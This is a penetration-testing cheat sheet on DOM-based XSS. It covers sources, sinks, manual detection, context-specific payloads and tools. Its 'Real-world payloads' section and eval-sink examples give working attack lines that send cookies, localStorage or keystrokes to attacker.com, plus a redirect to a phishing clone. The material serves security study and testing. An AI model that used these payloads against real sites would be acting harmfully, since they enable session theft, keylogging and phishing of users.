# DOM-Based XSS

## What it is
The server never touches your payload. JavaScript on the page itself reads attacker-controlled data (the **source**) and writes it into the DOM unsafely (the **sink**). The entire attack happens client-side — no server involvement, no server logs.

**Key trait:** Invisible to server-side WAFs and filters. The server sends a perfectly clean response — the browser's own JS does the damage.

---

## Source vs Sink

| Term   | What it means | Common examples |
|--------|---------------|-----------------|
| Source | Where attacker-controlled data enters the JS | `location.search`, `location.hash`, `location.href`, `document.referrer`, `window.name`, `postMessage` |
| Sink   | Where that data gets written dangerously | `document.write()`, `innerHTML`, `outerHTML`, `eval()`, `setTimeout()`, `setInterval()`, `src`, `href` |

**The vulnerability exists when data flows from a source to a sink without sanitization.**

---

## How it differs from reflected and stored XSS

| Type      | Server involved? | Payload stored? | Who gets hit? |
|-----------|-----------------|----------------|---------------|
| Reflected | Yes             | No             | One user (needs crafted link) |
| Stored    | Yes             | Yes (DB)       | All visitors  |
| DOM-based | No              | No             | One user (needs crafted link) |

---

## Common sources

```javascript
location.search          // URL query string (?q=...)
location.hash            // URL fragment (#...)
location.href            // full URL
document.referrer        // referring page URL
window.name              // persists across page loads
postMessage              // cross-origin messages
localStorage / sessionStorage  // if populated from URL
```

---

## Common sinks

```javascript
// HTML injection sinks
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()

// JavaScript execution sinks
eval()
setTimeout("string")
setInterval("string")
new Function("string")

// URL sinks (javascript: protocol)
location.href
location.assign()
location.replace()
element.src
element.href
```

---

## Finding DOM XSS manually

1. **Identify sources** — check what user-controlled data the page JS reads (`location.search`, `location.hash`, etc.)
2. **Trace the data flow** — follow the variable through the code. Does it reach a sink?
3. **Check the context** — where exactly does your input land in the DOM?
4. **Craft the payload** — based on the context

**In Burp:** Use DOM Invader (built into Burp's browser) — it automatically traces source-to-sink flows and flags vulnerable paths.

---

## Payloads by sink type

### document.write() sink
Input lands inside an existing HTML tag (e.g. `<img src="YOUR_INPUT">`):
```
# Break out of attribute + inject new tag
"><svg onload=alert(1)>
"><img src=x onerror=alert(1)>
"><script>alert(1)</script>

# Stay inside the tag — add event handler
" src=x onerror="alert(1)
" onmouseover="alert(1)
```

### innerHTML sink
```
# script tags don't execute via innerHTML — use event handlers
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### eval() / setTimeout() / setInterval() sink
Input is executed directly as JavaScript:
```
alert(1)
alert(document.domain)
fetch('https://attacker.com/?c='+document.cookie)
```

### location.href / src / href sink (URL context)
```
javascript:alert(1)
```

---

## Real-world payloads

```javascript
// Cookie theft
"><script>new Image().src='https://attacker.com/?c='+document.cookie</script>

// Cookie theft via onerror (when script tags blocked)
"><img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">

// localStorage exfil
"><img src=x onerror="fetch('https://attacker.com/?d='+btoa(JSON.stringify(localStorage)))">

// Keylogger
"><img src=x onerror="document.onkeypress=function(e){fetch('https://attacker.com/?k='+e.key)}">

// Redirect to phishing
"><img src=x onerror="location='https://evil-clone.com'">
```

---

## Context-based payload selection

When your input lands inside a specific HTML context, the payload needs to match:

**Inside attribute value (`src`, `value`, `action`):**
```
" src=x onerror="alert(1)       <- add event handler to same tag
"><svg onload=alert(1)>          <- break out and inject new tag
```

**Inside `<script>` block as a string:**
```javascript
// Original code: var q = 'YOUR_INPUT';
// Payload:
';alert(1);//
\';alert(1);//
```

**Inside `href` or `src` attribute:**
```
javascript:alert(1)
```

**Inside HTML body (bare):**
```
<script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
```

---

## Tools

| Tool | Use |
|------|-----|
| Burp DOM Invader | Auto-traces source → sink flows, flags vulnerable paths |
| Browser DevTools | Manually trace JS, set breakpoints on sinks |
| DOMPurify checker | Test if a sanitizer is bypassable |
| dalfox | CLI DOM XSS scanner |

---

## Common mistakes

- Using `<script>alert(1)</script>` against an `innerHTML` sink — script tags injected via innerHTML don't execute
- Forgetting to break out of the attribute context before injecting a tag
- Not checking `location.hash` — it's never sent to the server, so server logs won't show it, but it's a valid DOM XSS source
- Assuming no server-side filter = no filter — the JS itself may sanitize before writing to the sink
